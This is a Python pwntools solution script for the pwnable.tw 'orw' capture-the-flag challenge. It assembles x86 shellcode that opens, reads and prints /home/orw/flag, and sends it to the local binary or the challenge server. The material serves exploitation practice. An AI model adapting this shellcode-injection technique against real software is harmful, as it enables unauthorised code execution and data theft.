#coding:utf-8
from pwn import *

para = 0
#shellcode=asm(shellcraft.sh())
shellcode=""
shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
#open(file,0,0)
shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
#read(3,file,0x30)
shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
#write(1,file,0x30)

def pwn():
	para = input("native processing or remote connection, 1 for latter,0 for former: ")
	if (para == 0):
		native_process()
	else:
		remote_connection()
def remote_connection():
	p=remote('chall.pwnable.tw',10001)#远程
	p.recv()
	p.sendline(shellcode)

	p.interactive()


def native_process():
	p = process('./orw')
	p.recv()

	p.sendline(shellcode)

	p.interactive()
pwn()
